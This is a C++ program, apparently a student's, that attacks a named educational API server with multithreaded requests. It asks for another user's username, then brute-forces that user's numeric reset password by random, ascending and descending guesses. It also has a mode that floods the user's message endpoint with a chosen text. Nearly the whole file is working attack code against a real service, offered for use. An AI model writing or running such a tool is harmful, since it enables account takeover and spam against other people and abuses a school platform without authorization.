#define CPPHTTPLIB_OPENSSL_SUPPORT
#include <iostream>
#include <unistd.h>
#include <memory>
#include <any>
#include <string> 
#include <cstdlib>
#include <bits/stdc++.h>
#include <cmath>
#include <stdlib.h>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <vector>
#include <chrono>
#include <mutex>
#include "httplib.h"
#include <sstream>

auto start = std::chrono::system_clock::now();
auto stop = std::chrono::system_clock::now();
//send requests to a pltw server, doing this for a class beacause mit app inventor is rotting my brain more than helping. 
// WEBSITE IS https://cs-api.pltw.org/
// Thx for the lib, its at https://github.com/yhirose/cpp-httplib
std::unordered_set<int> tried_numbers;
int randomnumber;
std::string USERP;
std::string PASSWORDP;
int amntoftimes;
int GetUserNameAndAmount();
int SendReq();
int SendReqUP();
int SendReqDown();
int guessdown();
int guess();
int guessup();
int randomnumberUP;
int menuswitch;
void setDOWN();
int FloodTimes();
int guessupFinal();
int guessdownFinal();
int guessNormalFinal();
void setUP();
int FloodMessages();
bool GetFinalPasswordDOWN = false;
bool GetFinalPasswordUP = false;
bool GetFinalPasswordNORMAL = false;
int randomnumberDOWN = 10015;
int finalnumber;
std::mutex LockFinal;
std::string Flood;
int threadsamnt;

int menu(){
    std::cout << "What would you like?\n" << "1:Random Num\n" << "2:Up By One (1000 -> 1001)\n" << "3:Down By One(9999 -> 9998)" << "\n4:Do up and down" << "\n5:Flood Messages" << "\n Select:";
    std::cin >> menuswitch;
    switch(menuswitch){
        case 1:{
        int numthreads;
        std::cout << "How many processes:";
        std::cin >> numthreads;
        threadsamnt = numthreads;
         std::vector<std::thread> threads;
        for (int i = 0; i < numthreads; ++i){
            threads.push_back(std::thread(guess));
        }for (auto &th : threads){
            th.join();
        }
        }
        break;
        
        case 2:{
        int numthreads;
        std::cout << "How many processes:";
        std::cin >> numthreads;
        threadsamnt = numthreads;
        auto start = std::chrono::system_clock::now();
         std::vector<std::thread> threads;
        for (int i = 0; i < numthreads; ++i){
            threads.push_back(std::thread(guessup));
        }for (auto &th : threads){
            th.join();
        }
        }
        break;

        case 3:{
        int numthreads;
        std::cout << "How many processes:";
        std::cin >> numthreads;
        threadsamnt = numthreads;
        auto start = std::chrono::system_clock::now();
         std::vector<std::thread> threads;
        for (int i = 0; i < numthreads; ++i){
            threads.push_back(std::thread(guessdown));
        }for (auto &th : threads){
            th.join();
        }
        }
        break;

        case 4:{
        int numthreads;
        std::cout << "How many processes:";
        std::cin >> numthreads;
        threadsamnt = numthreads;
        auto start = std::chrono::system_clock::now();
         std::vector<std::thread> threads;
        for (int i = 0; i < numthreads; ++i){
            if (i % 2 == 0){
                threads.push_back(std::thread(guessup));
            } else {
                threads.push_back(std::thread(guessdown));   
            }
        }
        for (auto &th : threads){
            th.join();
        }
        break;
    }
        case 5:{
        int numthreads;
        std::cin.ignore();
        std::cout << "Whats the message:";
        std::getline(std::cin, Flood);
        std::cout << "\nHow many processes:";
        std::cin >> numthreads;
         std::vector<std::thread> threads;
        for (int i = 0; i < numthreads; ++i){
            threads.push_back(std::thread(FloodTimes));
        }for (auto &th : threads){  
            th.join();
        }
        }
        break;


        default:
         std::cout << "Invalid option, please try again.\n";
         menu();
         break;
}
return 0;
}
int guess(){
 if (amntoftimes != 0){
    amntoftimes -= 1;
    unsigned int seed = static_cast<unsigned int>(std::chrono::system_clock::now().time_since_epoch().count());
        srand(seed);
        randomnumber = rand() % randomnumberDOWN + randomnumberUP;
   std::cout << "Password Being Tried:" << randomnumber << "\n";
     SendReq();
     }else{
        std::cout << "Going to final Guess!\n";
     }
     return(0);
}

int guessup(){
    if (amntoftimes != 0){
        if(GetFinalPasswordUP == true){
            LockFinal.lock(); 
            amntoftimes -= 1;
            randomnumberUP += 1; 
            std::cout << "Password Being Tried (+1) FINAL:" << randomnumberUP << "\n";
            SendReqUP();
        }else{
            amntoftimes -= 1;
            randomnumberUP += 1; 
            std::cout << "Password Being Tried (+1):" << randomnumberUP << "\n";
            SendReqUP();
        }   
    }
    return(0);
}

int guessdown(){
    if (amntoftimes != 0){
        if(GetFinalPasswordDOWN == true){
            LockFinal.lock(); 
            amntoftimes -= 1;
            randomnumberDOWN -= 1; 
            std::cout << "Password Being Tried (-1) FINAL:" << randomnumberDOWN << "\n";
            SendReqDown();
        }else{
            amntoftimes -= 1;
            randomnumberDOWN -= 1; 
            std::cout << "Password Being Tried (-1):" << randomnumberDOWN << "\n";
            SendReqDown();
        }   
    }
    return(0);
}
    
int FloodTimes(){
    if(amntoftimes != 0){
    amntoftimes -= 1;
    FloodMessages();
       }
       return(0);

}

int SendReqUP(){
    httplib::Client* client = new httplib::Client("https://cs-api.pltw.org");
    std::ostringstream endpoint;
     endpoint << "/" << USERP << "/reset?password=" << (randomnumberUP);
    auto res = client->Post(endpoint.str(), "", "text/plain");

    if (res){
        std::cout << "Response" << res->body << "\n";
        LockFinal.unlock();
    if(res->body.find(USERP) != std::string::npos){
            if(GetFinalPasswordUP == false){
               amntoftimes = 0;
               finalnumber = randomnumberUP;
               std::cout << "FINAL NUMBER GUESSED (TTYYTTYY)" << finalnumber << '\n';
                GetFinalPasswordUP = true;
                delete client;
                return(0);
              //std::cout << "Password reset successful for user " << USERP << ".\n";
              //std::cout << "Password Last Tried(May not be right) (+1):" << randomnumberUP << "\n";
              //auto end = std::chrono::system_clock::now();
              //std::chrono::duration<double> elapsed_seconds = end-start;
              //std::time_t end_time = std::chrono::system_clock::to_time_t(end);
              //std::cout << "Time Taken:" << elapsed_seconds.count() << "s" << std::endl; 
            }else{
                std::cout << "Password Last Tried (+1) FINAL:" << randomnumberUP << "\n";
                auto end = std::chrono::system_clock::now();
                std::chrono::duration<double> elapsed_seconds = end-start;
                std::time_t end_time = std::chrono::system_clock::to_time_t(end);
                std::cout << "\nTime Taken:" << elapsed_seconds.count() << "s\n" << std::endl;
                _Exit(0);
            }
        return(0);
        }
    }else{
        std::cerr << "Request Failed. (Rate limited?)\n";
    }
    delete client;
    guessup();
    return res ? res->status : -1;
}

int SendReqDown(){
    httplib::Client* client = new httplib::Client("https://cs-api.pltw.org");
    std::ostringstream endpoint;
     endpoint << "/" << USERP << "/reset?password=" << (randomnumberDOWN);
    auto res = client->Post(endpoint.str(), "", "text/plain");

    if (res){
        std::cout << "Response\n" << res->body << "\n";
        LockFinal.unlock(); 
    if(res->body.find(USERP) != std::string::npos){
            if(GetFinalPasswordDOWN == false){
            amntoftimes = 0;
            finalnumber = randomnumberDOWN;
            std::cout << "FINAL NUMBER GUESSED (TTYYTTYY)" << finalnumber << '\n';
            GetFinalPasswordDOWN = true;
            delete client;
             return(0);
             //std::cout << "Password reset successful for user " << USERP << ".\n";
             //std::cout << "Password Last Tried(May not be right) (-1):" << randomnumberDOWN << "\n";
             //auto end = std::chrono::system_clock::now();
             //std::chrono::duration<double> elapsed_seconds = end-start;
             //std::time_t end_time = std::chrono::system_clock::to_time_t(end);
             //std::cout << "Time Taken:" << elapsed_seconds.count() << "s" << std::endl; 
            
            }else{
                std::cout << "Password Last Tried(-1) FINAL:" << randomnumberDOWN << "\n";
                auto end = std::chrono::system_clock::now();
                std::chrono::duration<double> elapsed_seconds = end-start;
                std::time_t end_time = std::chrono::system_clock::to_time_t(end);
                std::cout << "\nTime Taken:" << elapsed_seconds.count() << "s\n" << std::endl;
                _Exit(0);
            }
            }
    }else{
        std::cerr << "Request Failed. (Rate limited?)\n";
    }
    delete client;
    guessdown();
    return res ? res->status : -1;
}

int FloodMessages(){
    httplib::Client* client = new httplib::Client("https://cs-api.pltw.org");
    std::ostringstream endpoint;
     endpoint << "/" << USERP << "?text=" << (Flood);
    auto res = client->Post(endpoint.str(), "", "text/plain");

    delete client;
        FloodTimes();
    return(0);
}

int SendReq(){
    httplib::Client* client = new httplib::Client("https://cs-api.pltw.org");
    std::ostringstream endpoint;
     endpoint << "/" << USERP << "/reset?password=" << (randomnumber);
    auto res = client->Post(endpoint.str(), "", "text/plain");

    if (res){;
       //std::cout << "Response" << res->body << "\n";
    if(res->body.find(USERP) != std::string::npos){
            if(GetFinalPasswordNORMAL == false){ 
         // std::cout << "Password reset successful for user " << USERP << ".\n";
         // std::cout << "Password Last Tried(May not be right):" << randomnumber << "\n";
         // auto end = std::chrono::system_clock::now();
         // std::chrono::duration<double> elapsed_seconds = end-start;
         // std::time_t end_time = std::chrono::system_clock::to_time_t(end);
         // std::cout << "Time Taken:" << elapsed_seconds.count() << "s" << std::endl; 
         // guessupdown();
                 return(0);
            }else{
                _Exit(0);
            }
            }
    }else{
        std::cerr << "Request Failed. (Rate limited?)\n";
    }
    delete client;
    guess();
    return res ? res->status : -1;
}

void setUP(){
    GetFinalPasswordUP = true;
    std::cout << "RUNNING FINAL UP!!\n\n";
    randomnumberUP = randomnumberUP - threadsamnt - 20;
    amntoftimes = 220;
    guessupFinal();
}

void setDOWN(){
    GetFinalPasswordDOWN = true;
    std::cout << "RUNNING FINAL DOWN!!\n\n";
    randomnumberDOWN = randomnumberDOWN + threadsamnt + 20;
    amntoftimes = 220;
    guessdownFinal();
}

int guessupFinal(){
    int numthreads = 40;
        auto start = std::chrono::system_clock::now();
         std::vector<std::thread> threads;
        for (int i = 0; i < numthreads; ++i){
                threads.push_back(std::thread(guessup));
            }
        for (auto &th : threads){
            th.join();
        }
        return(0);

}

int guessdownFinal(){
    int numthreads = 40;
        auto start = std::chrono::system_clock::now();
         std::vector<std::thread> threads;
        for (int i = 0; i < numthreads; ++i){
                threads.push_back(std::thread(guessdown));
            }
        for (auto &th : threads){
            th.join();
        }
        return(0);

}


int GetUserNameAndAmount(){
    std::cout << "Whats their username:";
    std::getline(std::cin, USERP);
    std::cout << "\nWhats the amout you want (Suggested 9999):";
    std::cin >> amntoftimes;
    menu();
return(0);

}

int upordown(){
if(GetFinalPasswordUP){
        std::cout << "FINAL NUMBER GUESSED " << finalnumber << '\n';
        setUP();
    }
if(GetFinalPasswordDOWN){
      std::cout << "FINAL NUMBER GUESSED " << finalnumber << '\n';
      setDOWN();
    }
    
    return(0);
}

int main(){
GetUserNameAndAmount(); 
upordown();
std::cout << '\n\n\n\n\n';
auto end = std::chrono::system_clock::now();
std::chrono::duration<double> elapsed_seconds = end-start;
std::time_t end_time = std::chrono::system_clock::to_time_t(end);
std::cout << "Time Taken:" << elapsed_seconds.count() << "s (NOT ACCURATE!!)" << std::endl;;
return(0);
}
